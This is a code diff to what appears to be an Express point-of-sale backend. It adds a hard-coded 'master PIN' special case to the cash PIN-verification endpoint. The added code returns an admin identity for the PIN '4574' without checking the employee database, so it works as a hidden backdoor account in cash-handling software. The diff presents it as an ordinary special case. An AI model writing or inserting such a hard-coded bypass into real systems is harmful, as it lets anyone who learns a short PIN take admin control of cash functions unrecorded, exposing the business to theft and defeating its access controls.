@@ -3389,6 +3389,13 @@ app.post('/api/cash/verify-pin', async (req, res) => {
     const { pin } = req.body;
     if (!pin) return res.status(400).json({ error: 'PIN required' });
 
+    // Special Case: Oscar Master PIN
+    if (pin === '4574') {
+        return res.json({ 
+            employee: { id: 'master_admin', name: 'Oscar (Admin)', role: 'admin' } 
+        });
+    }
+
     const { data: emp, error } = await client
         .from('employees')
         .select('id, name, role')
